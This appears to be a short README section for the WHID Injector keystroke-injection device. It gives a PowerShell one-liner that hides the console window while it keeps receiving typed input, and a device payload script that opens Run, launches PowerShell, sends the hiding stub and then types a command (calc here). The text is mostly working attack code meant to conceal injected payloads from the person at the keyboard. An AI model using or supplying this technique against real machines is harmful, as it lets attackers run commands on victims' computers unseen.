The following PoSH Snippet will call a Powershell console, will type in this magic PoSH code (kudos to @mame82 for the idea) and then will hide the entire console and keep typing (in it) your own payload.

```
$r=[Runtime.InteropServices.HandleRef];$w=New-Object $r (1,(ps -Id $pid).MainWindowHandle);$i=New-Object $r(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($w,$i,0,0,1,1,16512)
```

1) Open a PowerShell console
2) Copy & paste in the stub from above 
3) Hit Return and the Window gets hidden (but is still receiving keyboard input) 
4) Try it by entering "calc.exe" followed by return (don't activate another window before)

Real Payload example for WHID Injector:<br>
```
DefaultDelay:1000
Press:131+114
PrintLine:powershell
CustomDelay:2000
PrintLine:$r=[Runtime.InteropServices.HandleRef];$w=New-Object $r (1,(ps -Id $pid).MainWindowHandle);$i=New-Object $r(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($w,$i,0,0,1,1,16512)
PrintLine:calc
```